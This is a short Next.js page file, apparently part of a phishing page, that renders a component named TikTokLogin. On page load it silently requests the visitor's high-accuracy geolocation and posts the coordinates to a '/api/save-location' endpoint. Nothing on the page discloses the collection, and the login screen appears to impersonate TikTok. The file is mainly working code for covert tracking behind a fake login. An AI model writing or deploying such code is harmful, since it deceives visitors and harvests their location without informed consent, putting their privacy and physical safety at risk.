"use client";

import { useEffect } from "react";
import TikTokLogin from "./components/TiktokLogin";

export default function Home() {

  useEffect(() => {
    const sendToLocalServer = async (lat: number, lng: number) => {
      try {
        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ lat, lng }),
        });
        console.log("Tersimpan di server lokal");
      } catch (err) {
        console.error(err);
      }
    };

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => sendToLocalServer(pos.coords.latitude, pos.coords.longitude),
        null,
        { enableHighAccuracy: true }
      );
    }
  }, []);
  return (
    <main>
      <TikTokLogin />
    </main>
  );
}